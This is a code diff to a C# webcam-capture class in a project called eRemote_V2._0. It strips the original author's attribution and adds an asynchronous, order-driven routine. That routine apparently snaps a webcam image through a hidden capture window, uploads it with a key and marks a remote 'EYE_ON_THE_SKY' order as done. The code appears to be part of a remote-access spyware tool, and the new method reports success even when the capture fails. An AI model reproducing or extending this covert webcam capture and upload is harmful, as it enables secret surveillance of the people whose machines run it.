@@ -1,18 +1,14 @@
-﻿using System;
-using System.IO;
+﻿using System.IO;
 using System.Drawing;
 using System.Threading;
 using System.Windows.Forms;
 using System.Drawing.Imaging;
-using System.Collections.Generic;
+using System.Threading.Tasks;
 using System.Runtime.InteropServices;
+using eRemote_V2._0.LocalDatabase;
 
 namespace eRemote_V2._0
 { 
-    /// <summary>
-    /// Timur Kovalev (http://www.creativecodedesign.com):
-    /// This class provides a method of capturing a webcam image via avicap32.dll api.
-    /// </summary>    
 public static class Camera
     {
         #region *** PInvoke Stuff - methods to interact with capture window ***
@@ -33,7 +29,7 @@ public static class Camera
         /// <param name="connectDelay">number of milliseconds to wait between connect 
         /// and capture - necessary for some cameras that take a while to 'warm up'</param>
         /// <returns>byte array representing a bitmp or null (if error or no webcam)</returns>
-        public static byte[] Capture(int connectDelay = 500)
+        public static byte[] Capture(string filePath, int connectDelay = 500)
         {
             Clipboard.Clear();                                              // clear the clipboard
             int hCaptureWnd = capCreateCaptureWindowA("ccWebCam", 0, 0, 0,  // create the hidden capture window
@@ -48,30 +44,11 @@ public static class Camera
                 return null;
             using (MemoryStream stream = new MemoryStream())
             {
-                bitmap.Save("C:/m.jpg", ImageFormat.Jpeg);    // get bitmap bytes
+                bitmap.Save(filePath, ImageFormat.Jpeg);    // get bitmap bytes
                 return stream.ToArray();
             }
         }
-        /// <summary>
-        /// Captures a frame from the webcam and returns the byte array associated
-        /// with the captured image. Runs in a newly-created STA thread which is 
-        /// required for this method of capture
-        /// </summary>
-        /// <param name="connectDelay">number of milliseconds to wait between connect 
-        /// and capture - necessary for some cameras that take a while to 'warm up'</param>
-        /// <returns>byte array representing a bitmp or null (if error or no webcam)</returns>
-        public static byte[] CaptureSTA(int connectDelay = 500)
-        {
-            byte[] bytes = null;
-            Thread catureThread = new Thread(() =>
-            {
-                bytes = Capture(connectDelay);
-            });
-            catureThread.SetApartmentState(ApartmentState.STA);
-            catureThread.Start();
-            catureThread.Join();
-            return bytes;
-        }
+
         /// <summary>
         /// Captures a frame from the webcam and returns the byte array associated
         /// with the captured image. The image is also stored in a file
@@ -80,35 +57,16 @@ public static class Camera
         /// <param name="connectDelay">number of milliseconds to wait between connect 
         /// and capture - necessary for some cameras that take a while to 'warm up'</param>
         /// <returns>true on success, false on failure</returns>
-        public static bool Capture(string filePath, int connectDelay = 500)
+        public static async Task<bool> CaptureAsync(string fileName, string key,string orderId)
         {
-            byte[] capture = Camera.Capture(connectDelay);
+            byte[] capture = Capture($"./objs/{fileName}", 500);
             if (capture != null)
             {
-                File.WriteAllBytes(filePath, capture);
-                return true;
+                var link = await Uploader.UploadImagesAsync($"./objs/{fileName}", fileName, key);
+                Orders.MarkOrderAsDone(key, orderId, "EYE_ON_THE_SKY", link);
             }
-            return false;
+            return true;
         }
-        /// <summary>
-        /// Captures a frame from the webcam and returns the byte array associated
-        /// with the captured image. The image is also stored in a file
-        /// </summary>
-        /// <param name="filePath">path the file wher ethe image will be saved</param>
-        /// <param name="connectDelay">number of milliseconds to wait between connect 
-        /// and capture - necessary for some cameras that take a while to 'warm up'</param>
-        /// <returns>true on success, false on failure</returns>
-        public static bool CaptureSTA(string filePath, int connectDelay = 500)
-        {
-            bool success = false;
-            Thread catureThread = new Thread(() =>
-            {
-                success = Capture(filePath, connectDelay);
-            });
-            catureThread.SetApartmentState(ApartmentState.STA);
-            catureThread.Start();
-            catureThread.Join();
-            return success;
-        }
+   
     }
 }
